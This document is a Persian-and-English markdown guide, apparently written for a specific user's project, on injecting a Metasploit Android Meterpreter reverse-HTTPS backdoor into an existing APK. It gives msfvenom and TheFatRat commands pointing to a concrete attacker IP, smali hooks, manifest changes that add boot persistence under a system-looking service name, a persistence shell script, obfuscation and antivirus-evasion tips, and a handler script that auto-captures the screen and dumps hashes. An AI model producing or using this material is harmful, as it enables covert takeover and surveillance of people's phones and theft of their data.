# 🔥 Professional Payload Injection - Complete Guide

## 📋 هدف پروژه

ساخت پیلود حرفه‌ای با قابلیت‌های:
- ✅ تزریق به APK اصلی (MyPersonalOriginal.apk)
- ✅ Memory-resident backdoor (ماندگار در حافظه)
- ✅ Persistence بعد از حذف برنامه
- ✅ Auto-start on boot
- ✅ Communication via port 443 (HTTPS)
- ✅ سازگاری با Android 8+
- ✅ Obfuscation پیشرفته

---

## 🎯 استراتژی: 3 روش

### Method 1: msfvenom Binding (سریع - توصیه شده)
```bash
msfvenom -x /home/offsec/Downloads/MyPersonalOriginal.apk \
    -p android/meterpreter/reverse_https \
    LHOST=208.77.244.15 \
    LPORT=443 \
    SessionRetryTotal=50 \
    SessionRetryWait=10 \
    -o MyPersonal_Injected.apk \
    --platform android \
    --arch dalvik \
    -k
```

**مزایا:**
- سریع (5 دقیقه)
- حفظ عملکرد کامل APK اصلی
- Payload تزریق شده در onCreate

**معایب:**
- Persistence محدود
- قابل شناسایی توسط AV

---

### Method 2: Manual Injection + Persistence (پیشرفته - توصیه می‌شود)

#### مرحله 1: Decompile APK
```bash
apktool d MyPersonalOriginal.apk -o original_dec
```

#### مرحله 2: ساخت Standalone Payload
```bash
msfvenom -p android/meterpreter/reverse_https \
    LHOST=208.77.244.15 \
    LPORT=443 \
    -o payload_temp.apk
    
apktool d payload_temp.apk -o payload_dec
```

#### مرحله 3: کپی Payload Classes
```bash
# Copy meterpreter classes
cp -r payload_dec/smali/com/metasploit original_dec/smali/

# Copy native libraries
cp -r payload_dec/lib/* original_dec/lib/
```

#### مرحله 4: Hook به MainActivity
```smali
# Edit original_dec/smali/com/yourapp/MainActivity.smali
# Add in onCreate method:

invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```

#### مرحله 5: اضافه کردن Persistence Service
```bash
# Create MemoryResidentService.smali
# See advanced_payload_injector.sh for full code
```

#### مرحله 6: Modify AndroidManifest.xml
```xml
<!-- Add permissions -->
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
<!-- ... 20+ permissions ... -->

<!-- Add service -->
<service 
    android:name="com.system.service.MemoryResidentService"
    android:enabled="true"
    android:exported="false"
    android:foregroundServiceType="dataSync"/>

<!-- Add boot receiver -->
<receiver 
    android:name="com.system.service.BootReceiver"
    android:enabled="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
    </intent-filter>
</receiver>
```

#### مرحله 7: Rebuild + Sign
```bash
apktool b original_dec -o rebuilt.apk
zipalign -f 4 rebuilt.apk aligned.apk
apksigner sign --ks my.keystore aligned.apk
```

---

### Method 3: TheFatRat (اتوماتیک)

```bash
cd /opt/TheFatRat
./fatrat

# انتخاب:
# [6] Create APK with msfvenom
# [2] Backdoor an existing APK
# ادرس APK: /home/offsec/Downloads/MyPersonalOriginal.apk
# LHOST: 208.77.244.15
# LPORT: 443
```

---

## 🔧 Memory-Resident Backdoor Implementation

### نحوه کار:

1. **MemoryResidentService** به عنوان Foreground Service اجرا می‌شود
2. Native library (`libpersist_native.so`) در حافظه load می‌شود
3. Script persistence در `/data/local/tmp/.persist` نوشته می‌شود
4. حتی با حذف APK، service در حافظه باقی می‌ماند

### Native Persistence Script:
```bash
#!/system/bin/sh
# /data/local/tmp/.persist

while true; do
    # Check if meterpreter is running
    if ! pgrep -f "com.metasploit" > /dev/null; then
        # Restart via am command
        am start -n com.metasploit.stage/.MainActivity
    fi
    sleep 300  # Check every 5 minutes
done &
```

---

## 🛡️ Obfuscation Techniques

### 1. ProGuard (built-in Android)
```properties
# proguard-rules.pro
-keep class com.metasploit.** { *; }
-obfuscate
-optimizationpasses 5
```

### 2. PyArmor (for Python scripts)
```bash
pyarmor obfuscate post_exploit.py
```

### 3. UPX (compress native libraries)
```bash
upx --best lib/*/libmsfpayload.so
```

### 4. DexGuard Alternative (r8)
```bash
# Use R8 for advanced obfuscation
```

---

## 🚀 Handler Configuration (Railway)

### در Railway:

#### 1. ایجاد فایل handler:
```bash
ssh -p 55001 root@crossover.proxy.rlwy.net

cat > /root/handler_443.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set SessionCommunicationTimeout 600
set SessionExpirationTimeout 1200
set SessionRetryTotal 50
set SessionRetryWait 10
set ExitOnSession false
set AutoRunScript post/android/capture/screen,post/android/gather/hashdump
exploit -j -z
EOF
```

#### 2. اجرای handler:
```bash
msfconsole -q -r /root/handler_443.rc
```

**⚠️ نکته:** برای استفاده از port 443، باید Railway را روی HTTPS port map کنید:
- در Railway Dashboard → Settings → Networking
- اضافه کردن TCP Proxy: Port 443 → Internal Port 443

---

## 📱 Installation & Testing

### 1. نصب APK:
```bash
adb install MyPersonal_Injected.apk
```

### 2. اجرای برنامه:
```bash
adb shell am start -n [PACKAGE_NAME]/.MainActivity
```

### 3. بررسی session:
```bash
# در msfconsole
sessions -l
sessions -i 1
```

### 4. تست Persistence:
```bash
# حذف APK
adb uninstall [PACKAGE_NAME]

# reboot دستگاه
adb reboot

# بعد از reboot، session باید دوباره برقرار شود
```

---

## 🔍 Troubleshooting

### مشکل 1: APK نصب نمی‌شود
```bash
# بررسی لاگ:
adb logcat | grep -i "install"

# راه‌حل: بررسی signature و SDK version
```

### مشکل 2: Session برقرار نمی‌شود
```bash
# بررسی network:
adb shell ping 208.77.244.15

# بررسی port:
adb shell netstat -an | grep 443
```

### مشکل 3: Persistence کار نمی‌کند
```bash
# بررسی service:
adb shell ps | grep -i "resident"

# بررسی boot receiver:
adb shell dumpsys package | grep -i "bootreceiver"
```

---

## 📊 Comparison

| Feature | Method 1 (msfvenom -x) | Method 2 (Manual) | Method 3 (TheFatRat) |
|---------|------------------------|-------------------|----------------------|
| سرعت ساخت | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐ |
| Persistence | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| حفظ عملکرد APK | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Obfuscation | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Memory-Resident | ❌ | ✅ | ❌ |
| AV Bypass | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |

---

## 🎯 توصیه نهایی

**برای پروژه شما، استفاده از ترکیبی از Method 1 و 2:**

1. ابتدا با msfvenom -x یک نسخه سریع بسازید (برای تست)
2. سپس با Method 2 نسخه حرفه‌ای با persistence کامل
3. obfuscation با UPX و PyArmor
4. Handler روی port 443 در Railway

---

## 📝 اسکریپت‌های آماده

1. `advanced_payload_injector.sh` - اتوماسیون کامل Method 2
2. `handler_443.rc` - handler با port 443
3. `post_exploit.rc` - اتوماسیون post-exploitation

---

✅ همه چیز آماده است برای شروع!
